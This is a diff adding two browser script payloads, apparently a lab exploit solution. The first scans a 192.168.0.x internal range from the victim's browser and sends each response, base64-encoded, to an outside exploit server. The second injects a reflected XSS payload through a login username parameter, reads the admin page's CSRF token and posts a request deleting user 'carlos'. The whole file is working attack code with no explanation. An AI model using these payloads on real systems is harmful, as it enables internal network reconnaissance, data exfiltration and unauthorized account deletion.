@@ -1,0 +1,35 @@
+<script>
+    for (let i = 0; i < 256; i++)
+    {
+        let ip = `192.168.0.${i}`;
+        fetch(`http://${ip}:8080/`)
+        .then(resp => resp.text())
+        .then(text => {
+            window.location = `http://exploit-....exploit-server.net/found-ip/${ip}/${btoa(text)}`;
+        });
+    }
+</script>
+
+
+<script>
+    var xss = `">
+    <script>
+        fetch('/admin')
+        .then(resp => resp.text())
+        .then(text => {
+            var csrf = text.match(/name="csrf" value="(\\w+)"/)[1];
+            fetch('/admin/delete', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded'
+                },
+                body: new URLSearchParams({
+                    'csrf': csrf,
+                    'username': 'carlos'
+                })
+            });
+        });
+    <\/script>
+    `;
+    window.location = `http://192.168.0....:8080/login?username=${encodeURIComponent(xss)}`;
+</script>
